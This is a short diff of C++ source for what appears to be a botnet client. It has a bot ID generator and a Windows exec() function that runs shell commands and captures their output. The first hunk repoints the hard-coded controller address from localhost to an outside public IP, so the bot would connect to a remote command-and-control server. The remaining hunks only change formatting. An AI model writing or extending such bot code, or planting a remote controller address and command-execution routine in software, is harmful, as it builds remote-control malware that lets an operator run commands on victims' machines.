@@ -24,7 +24,7 @@
 
 using namespace std;
 
-const string CONTROLLER_IP = "127.0.0.1";
+const string CONTROLLER_IP = "81.200.153.234";
 const int CONTROLLER_PORT = 12345;
 
 #ifdef _WIN32
@@ -50,11 +50,11 @@ string generate_bot_id() {
 string BOT_ID = generate_bot_id();
 
 #ifdef _WIN32
-string exec (const char* cmd){
+string exec(const char* cmd) {
     array < char, 128 > buffer;
     string result;
     unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd, "r"), _pclose);
-    if (!pipe){
+    if (!pipe) {
         throw runtime_error("popen() failed");
     }
     while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
